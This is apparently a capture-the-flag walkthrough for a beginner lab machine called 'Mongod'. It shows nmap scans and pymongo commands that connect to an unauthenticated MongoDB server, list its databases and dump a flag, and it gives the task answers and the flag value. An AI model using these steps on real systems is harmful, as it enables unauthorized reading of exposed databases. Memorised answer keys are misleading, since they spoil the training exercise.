# Mongod

- **Category**: Starting Point - Tier 0
- **Difficulty**: Very Easy
- **Tags**: MongoDB, Web, Databases, Reconnaissance, Misconfiguration, Anonymous/Guest Access - **Tools**: nmap
- **Tools**: nmap, ipython+pymongo or mongodb


# Walkthrough

- [MongoDB Command Reference](https://www.mongodb.com/docs/manual/reference/command/)

## Task 1: How many TCP ports are open on the machine?

```bash
> nmap -p- -sT --min-rate 3000 10.129.58.99
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-04 18:53 AEST
Nmap scan report for 10.129.58.99
Host is up (0.23s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
27017/tcp open  mongod
```

> **Answer**: 2

## Task 2: Which service is running on port 27017 of the remote host?

```bash
> nmap -sV -p 27017 10.129.58.99
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-04 18:55 AEST
Nmap scan report for 10.129.58.99
Host is up (0.28s latency).

PORT      STATE SERVICE VERSION
27017/tcp open  mongodb MongoDB 3.6.8
```

> **Answer**: mongodb 3.6.8

## Task 3: What type of database is MongoDB? (Choose: SQL or NoSQL)

- **Explanation**: https://www.mongodb.com/nosql-explained

> **Answer**: NoSQL

## Task 4: What is the command name for the Mongo shell that is installed with the mongodb-clients package?

> **Answer**: mongo

## Task 5: What is the command used for listing all the databases present on the MongoDB server? (No need to include a trailing ;)

> **Answer**: show databases

## Task 6: What is the command used for listing out the collections in a database? (No need to include a trailing ;)

> **Answer**: show collections

## Task 7: What is the command used for dumping the content of all the documents within the collection named flag in a format that is easy to read?

> **Answer**: db.flag.find().pretty()

# Submit Root Flag

We can use the lightweight `pymongo` python package. You can install this and use with `ipython` for a lightweight MongoDB client.
The advantage of utilising the python package is the ease in which we can automate it to suit our needs.
Howevr, in this case I've just run through the commands one-by-one to demonstrate the process:

```bash
> python3 -m pip install pymongo ipython
> ipython
In [1]: from pymongo import MongoClient

In [2]: client = MongoClient('10.129.58.99', 27017)

In [3]: print(client.list_database_names())
['admin', 'config', 'local', 'sensitive_information', 'users']

In [4]: database = client.admin

In [5]: database.list_collection_names()
Out[5]: ['system.version']

In [6]: database = client.sensitive_information

In [7]: database.list_collection_names()
Out[7]: ['flag']

In [8]: [print(x) for x in database['flag'].find()]
{'_id': ObjectId('630e3dbcb82540ebbd1748c5'), 'flag': '1b6e6fb359e7c40241b6d431427ba6ea'}
```

> **Answer**: 1b6e6fb359e7c40241b6d431427ba6ea
